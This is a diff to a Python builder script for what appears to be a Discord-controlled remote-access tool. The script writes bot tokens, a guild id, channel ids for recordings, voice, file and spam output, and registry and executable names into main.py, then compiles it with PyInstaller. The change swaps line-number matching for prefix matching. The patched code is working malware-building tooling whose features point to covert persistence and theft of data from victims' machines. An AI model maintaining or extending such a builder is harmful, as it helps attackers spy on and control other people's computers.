@@ -3,6 +3,7 @@ import sys
 import hashlib
 from tkinter import Tk, filedialog
 
+
 def get_file_hash(path):
     sha256_hash = hashlib.sha256()
     with open(path,"rb") as f:
@@ -69,37 +70,36 @@ pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyin
 with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
 with open('main.py', 'r', encoding='utf-8') as copy_source_code: source_code = copy_source_code.readlines()
 with open('main_prepared.py', 'w', encoding='utf-8') as edit_source_code:
-    for line in range(len(source_code)):
+    for line in source_code:
         if mode == 1:
-            match line:
-                case 79: edit_source_code.write('bot_tokens = [\'' + settings[6] + '\']\n')
-                case 80: edit_source_code.write('software_registry_name = \'' + settings[7] + '\'\n')
-                case 81: edit_source_code.write('software_directory_name = \'' + (settings[8] if settings[8] != '' else settings[7]) + '\'\n')
-                case 82: edit_source_code.write('software_executable_name = \'' + (settings[9] if settings[9] != '' else (settings[8] if settings[8] != '' else settings[7]) + '.exe') + '\'\n')
-                case 85: edit_source_code.write('    \'info\': ' + settings[0] + ',\n')
-                case 86: edit_source_code.write('    \'main\': ' + settings[1] + ',\n')
-                case 87: edit_source_code.write('    \'spam\': ' + settings[2] + ',\n')
-                case 88: edit_source_code.write('    \'file\': ' + settings[3] + ',\n')
-                case 89: edit_source_code.write('    \'recordings\': ' + settings[4] + ',\n')
-                case 90: edit_source_code.write('    \'voice\': ' + settings[5] + '\n')
-                case 93: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
-                case _: edit_source_code.write(source_code[line])
+            if line.startswith('bot_tokens'): edit_source_code.write('bot_tokens = [\'' + settings[6] + '\']\n')
+            elif line.startswith('software_registry_name'): edit_source_code.write('software_registry_name = \'' + settings[7] + '\'\n')
+            elif line.startswith('software_directory_name'): edit_source_code.write('software_directory_name = \'' + (settings[8] if settings[8] != '' else settings[7]) + '\'\n')
+            elif line.startswith('software_executable_name'): edit_source_code.write('software_executable_name = \'' + (settings[9] if settings[9] != '' else (settings[8] if settings[8] != '' else settings[7]) + '.exe') + '\'\n')
+            elif line.startswith('    \'info\':'): edit_source_code.write('    \'info\': ' + settings[0] + ',\n')
+            elif line.startswith('    \'main\':'): edit_source_code.write('    \'main\': ' + settings[1] + ',\n')
+            elif line.startswith('    \'spam\':'): edit_source_code.write('    \'spam\': ' + settings[2] + ',\n')
+            elif line.startswith('    \'file\':'): edit_source_code.write('    \'file\': ' + settings[3] + ',\n')
+            elif line.startswith('    \'recordings\':'): edit_source_code.write('    \'recordings\': ' + settings[4] + ',\n')
+            elif line.startswith('    \'voice\':'): edit_source_code.write('    \'voice\': ' + settings[5] + '\n')
+            elif line.startswith('secret_key'): edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'\n')
+            else: edit_source_code.write(line)
         else:
-            match line:
-                case 79: edit_source_code.write('bot_tokens = [\'' + ('\', \''.join(tokens) if tokens[-1] != '' else '\', \''.join(tokens[:-1])) + '\']\n')
-                case 80: edit_source_code.write('software_registry_name = \'' + settings[0] + '\'\n')
-                case 81: edit_source_code.write('software_directory_name = \'' + (settings[1] if settings[1] != '' else settings[0]) + '\'\n')
-                case 82: edit_source_code.write('software_executable_name = \'' + (settings[2] if settings[2] != '' else ((settings[1] if settings[1] != '' else settings[0]) + '.exe')) + '\'\n')
-                case 85: edit_source_code.write('    \'info\': None,\n')
-                case 86: edit_source_code.write('    \'main\': None,\n')
-                case 87: edit_source_code.write('    \'spam\': None,\n')
-                case 88: edit_source_code.write('    \'file\': None,\n')
-                case 89: edit_source_code.write('    \'recordings\': None,\n')
-                case 90: edit_source_code.write('    \'voice\': None\n')
-                case 93: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
-                case 94: edit_source_code.write('guild_id = ' + guild_id + '\n')
-                case 104: edit_source_code.write('#opuslib_path = \'resources/libopus-0.x64.dll\'\n')
-                case _: edit_source_code.write(source_code[line])
+            if line.startswith('bot_tokens'): edit_source_code.write('bot_tokens = [\'' + ('\', \''.join(tokens) if tokens[-1] != '' else '\', \''.join(tokens[:-1])) + '\']\n')
+            elif line.startswith('software_registry_name'): edit_source_code.write('software_registry_name = \'' + settings[0] + '\'\n')
+            elif line.startswith('software_directory_name'): edit_source_code.write('software_directory_name = \'' + (settings[1] if settings[1] != '' else settings[0]) + '\'\n')
+            elif line.startswith('software_executable_name'): edit_source_code.write('software_executable_name = \'' + (settings[2] if settings[2] != '' else ((settings[1] if settings[1] != '' else settings[0]) + '.exe')) + '\'\n')
+            elif line.startswith('    \'info\':'): edit_source_code.write('    \'info\': None,\n')
+            elif line.startswith('    \'main\':'): edit_source_code.write('    \'main\': None,\n')
+            elif line.startswith('    \'spam\':'): edit_source_code.write('    \'spam\': None,\n')
+            elif line.startswith('    \'file\':'): edit_source_code.write('    \'file\': None,\n')
+            elif line.startswith('    \'recordings\':'): edit_source_code.write('    \'recordings\': None,\n')
+            elif line.startswith('    \'voice\':'): edit_source_code.write('    \'voice\': None\n')
+            elif line.startswith('secret_key'): edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'\n')
+            elif line.startswith('guild_id'): edit_source_code.write('guild_id = ' + guild_id + '\n')
+            elif 'opuslib_path = \'resources/libopus-0.x64.dll\'' in line: pass
+            else: edit_source_code.write(line)
+            
 
 os.system(pyinstaller_command)
 input('Press ENTER after processing ends...')
